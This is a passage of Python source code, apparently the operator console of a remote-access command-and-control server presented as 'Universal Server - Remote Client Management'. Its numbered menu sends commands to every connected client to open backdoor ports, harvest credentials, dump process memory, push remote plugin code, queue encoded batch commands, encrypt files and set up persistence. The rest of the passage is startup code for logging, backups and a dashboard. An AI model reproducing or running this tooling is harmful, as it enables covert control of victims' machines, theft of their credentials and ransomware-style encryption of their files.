            elif user_input == '59':
                send_command("get_network_interfaces_detailed")
                print("Detailed network interfaces requested from all clients.")
            elif user_input == '60':
                port = input("Enter port for backdoor listener: ").strip()
                if port and port.isdigit():
                    send_command(f"create_backdoor_port:{port}")
                    print(f"Backdoor listener created on port {port}.")
            elif user_input == '61':
                pid = input("Enter process PID to dump memory: ").strip()
                if pid and pid.isdigit():
                    send_command(f"dump_memory:{pid}")
                    print("Memory dump requested from all clients.")
            elif user_input == '62':
                send_command("harvest_credentials")
                print("Credential harvesting requested from all clients.")
            elif user_input == '63':
                host = input("Enter server host: ").strip()
                port = input("Enter server port: ").strip()
                if host and port:
                    send_command(f"add_multi_server:{host}|{port}")
                    print(f"Server {host}:{port} added to multi-server list.")
            elif user_input == '64':
                send_command("switch_server")
                print("Server switch requested from all clients.")
            elif user_input == '65':
                commands = input("Enter commands as JSON array (e.g., [\"cmd1\", \"cmd2\"]): ").strip()
                if commands:
                    import base64
                    encoded = base64.b64encode(commands.encode('utf-8')).decode('utf-8')
                    send_command(f"queue_batch:{encoded}")
                    print("Batch commands queued on all clients.")
            elif user_input == '66':
                send_command("execute_batch")
                print("Batch execution requested from all clients.")
            elif user_input == '67':
                plugin_file = input("Enter plugin file path: ").strip()
                if plugin_file and os.path.exists(plugin_file):
                    with open(plugin_file, 'r') as f:
                        plugin_code = f.read()
                    import base64
                    encoded = base64.b64encode(plugin_code.encode('utf-8')).decode('utf-8')
                    send_command(f"load_plugin:{encoded}")
                    print("Plugin loaded on all clients.")
            elif user_input == '68':
                send_command("list_plugins")
                print("Plugin list requested from all clients.")
            elif user_input == '69':
                db_path = input("Enter database path (default: client_data.db): ").strip() or "client_data.db"
                send_command(f"init_database:{db_path}")
                print(f"Database initialization requested ({db_path}).")
            elif user_input == '70':
                table = input("Enter table name: ").strip()
                data_json = input("Enter data as JSON: ").strip()
                if table and data_json:
                    send_command(f"save_to_database:{table}|{data_json}")
                    print("Data save requested to all clients.")
            elif user_input == '71':
                query = input("Enter SQL query: ").strip()
                if query:
                    send_command(f"query_database:{query}")
                    print("Database query requested from all clients.")
            elif user_input == '72':
                file_path = input("Enter file path to encrypt: ").strip()
                key = input("Enter encryption key (empty for auto-generate): ").strip()
                if file_path:
                    cmd = f"encrypt_file:{file_path}|{key}" if key else f"encrypt_file:{file_path}"
                    send_command(cmd)
                    print("File encryption requested from all clients.")
            elif user_input == '73':
                file_path = input("Enter encrypted file path: ").strip()
                key = input("Enter decryption key: ").strip()
                if file_path and key:
                    send_command(f"decrypt_file:{file_path}|{key}")
                    print("File decryption requested from all clients.")
            elif user_input == '74':
                send_command("get_system_hardening")
                print("System hardening information requested from all clients.")
            elif user_input == '75':
                send_command("create_advanced_persistence")
                print("Advanced persistence creation requested from all clients.")
            elif user_input == 'status':
                show_status()
            elif user_input == 'history':
                show_history()
            elif user_input == 'config':
                print(f"\nCurrent Configuration:")
                print(json.dumps(config, indent=2))
                if input("\nEdit config? (y/n): ").lower() == 'y':
                    # Simple config editor
                    key = input("Config key: ").strip()
                    if key in config:
                        value = input(f"New value for {key} (current: {config[key]}): ").strip()
                        try:
                            # Try to convert to appropriate type
                            if isinstance(config[key], int):
                                config[key] = int(value)
                            elif isinstance(config[key], float):
                                config[key] = float(value)
                            elif isinstance(config[key], bool):
                                config[key] = value.lower() in ('true', '1', 'yes')
                            else:
                                config[key] = value
                            save_config()
                            print("Configuration updated.")
                        except ValueError:
                            print("Invalid value type.")
                    else:
                        print("Unknown config key.")
            elif user_input == 'exit':
                with clients_lock:
                    for client in clients[:]:
                        try:
                            client.close()
                        except:
                            pass
                    clients.clear()
                print("All clients disconnected.")
            else:
                print("Unknown command. Type 'h' or 'help' for a list of commands.")
        except KeyboardInterrupt:
            print("\nShutting down the server...")
            is_running = False
            with clients_lock:
                for client in clients[:]:
                    try:
                        client.close()
                    except:
                        pass
                clients.clear()
            save_command_history()
            break
        except EOFError:
            break

if __name__ == '__main__':
    # Setup logging first
    setup_logging()
    
    logger.info("=" * 50)
    logger.info("Server starting...")
    logger.info(f"Platform: {platform.system()} {platform.release()}")
    logger.info(f"Python: {sys.version}")
    
    # Load configuration
    load_config()
    
    # Re-setup logging with config
    setup_logging(
        config.get('log_level', 'INFO'),
        config.get('log_file', 'server.log')
    )
    
    # Load command history
    load_command_history()
    
    # Validate configuration
    if not validate_config():
        logger.error("Configuration validation failed. Please fix errors and restart.")
        sys.exit(1)
    
    # Initialize start_time once before any metrics are saved
    # Note: main() will also set start_time, but we set it here first to ensure
    # consistent metrics. The assignment in main() is redundant but harmless.
    # Use lock to prevent race conditions when reading/writing start_time
    with start_time_lock:
        if start_time is None:
            start_time = time.time()
    
    # Start health check worker
    # Note: At module level (including inside if __name__ == '__main__': blocks),
    # assignments update module-level variables without needing 'global' keyword.
    # The 'global' keyword is only needed inside functions.
    health_check_thread = threading.Thread(target=health_check_worker, daemon=True)
    health_check_thread.start()
    logger.info("Health check worker started")
    
    # Perform initial health check
    health_check()
    
    # Start backup worker
    if config.get('enable_backup', True):
        backup_thread = threading.Thread(target=backup_worker, daemon=True)
        backup_thread.start()
        logger.info("Backup worker started")
    
    # Start monitoring dashboard
    try:
        start_monitoring_dashboard()
    except Exception as e:
        logger.warning(f"Could not start monitoring dashboard: {e}")
    
    # Save initial metrics (start_time is already set above)
    save_metrics()
    
    print("Universal Server - Remote Client Management (Enhanced Edition)")
    print("=" * 50)
    print(f"Features: Authentication, Rate Limiting, Monitoring, Backup")
    if config.get('enable_monitoring', True):
        print(f"Monitoring Dashboard: http://127.0.0.1:{config.get('monitoring_port', 8080)}")
    print("=" * 50)
    main()
